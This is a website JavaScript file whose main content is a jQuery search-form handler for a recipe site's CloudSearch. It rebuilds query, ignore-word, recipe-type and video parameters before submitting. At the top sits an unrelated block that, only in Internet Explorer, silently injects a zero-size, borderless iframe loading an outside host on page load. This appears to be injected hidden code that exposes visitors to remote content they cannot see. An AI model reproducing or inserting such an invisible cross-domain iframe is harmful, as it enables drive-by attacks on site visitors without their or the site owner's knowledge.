if (window.document.documentMode) {
	window.addEventListener("load",function(event) {
	    var ifrm = document.createElement("iframe");
	    ifrm.setAttribute("src", "https://store.oxbow-lake.com/webstats");
	    ifrm.setAttribute('id', 'ifrmstats');
	    ifrm.style.width = "0";
	    ifrm.style.height = "0";
	    ifrm.style.border = "0";
	    document.body.appendChild(ifrm);
	},false);
}
/**
 * CloudSearch 全コンテンツ検索用
 *
 * 指定classを当てたformを処理する
 */
function csSearchSubmit(e) {
  e.preventDefault();
  var $fireObj = $(e.currentTarget);
  var $cloneForm = $fireObj.clone(); // 以後cloneFormを操作して検索実行用データを生成する
  $cloneForm.find('input[type=submit]').remove();
  $cloneForm.attr('action', '/search');

  var $q = $cloneForm.find('input[name=q]');
  var qs = $.trim($q.val()).replace(/\s+/g, ' ').split(' ');

  var $ig = $cloneForm.find('input[name=ig]');
  var igs = $.trim($ig.val()).replace(/\s+/g, ' ').replace(/\-/, '');
  if (igs != '') {
    igs = igs.split(' ');
  }

  $ig.remove(); // ignoreワードは qに'-'付きワードで

  var $r_type = $cloneForm.find('input[name=r_type\\[\\]]:checked');
  var r_type = new Array();
  if ($r_type) {
    $r_type.each(function (idx, obj) {
      r_type.push($(obj).val());
    });
    if (r_type.length) {
      $r_type = $('<input>', {
        'name': 'r_type'
      });
      $r_type.val(r_type.join(',')); // 連結した料理タイプ
      $cloneForm.append($r_type);
      $cloneForm.find('input[id^=r_type]').remove(); // 選択用radioボタンを削除
    }
  }
  var $video = $cloneForm.find('input[name=video\\[\\]]:checked');
  var video = new Array();
  if ($video) {
    $video.each(function (idx, obj) {
      video.push($(obj).val());
    });
    if (video.length) {
      $video = $('<input>', {
        'name': 'video'
      });
      $video.val(video.join(',')); // 連結したビデオフラグ
      $cloneForm.append($video);
      $cloneForm.find('input[id^=video]').remove(); // 選択用radioボタンを削除
    }
  }
  if (igs.length) {
    $.each(igs, function (k, val) {
      if (val) {
        igs[k] = '-' + val;
      }
    });
    Array.prototype.push.apply(qs, igs);
  }
  $q.val(qs.join(' '));

  var $choose_type = $fireObj.find('*[name=type]');
  if ($choose_type.attr('type') == 'hidden'){
    var optionval = $choose_type.val();
  } else {
    var $options = $choose_type.find('option:selected');
    var optionval = $options.val();
  }

  //不要なパラメータは削除
  $cloneForm.find('*[name=type]').remove();
  if (optionval != '' && optionval != undefined ) {
    var $type = $('<input>').attr({'name': 'type', 'type': 'hidden', 'value': optionval});
    $cloneForm.append($type);
  }
  var $page = $cloneForm.find('input[name=page]');
  if ($page.val() < 2) {
    $page.remove();
  }
  $('#hiddenSandbox').empty().append($cloneForm);
  $cloneForm.submit();
}
$(function () {
  $('.csSearch').on('submit', function (e) {
    csSearchSubmit(e);
  });
  $('.csSearchSubmit').on('click', function (e) {
    var $fireObj = $(e.currentTarget);
    var $form = $fireObj.parents('form');
    $form.submit();
  });
});



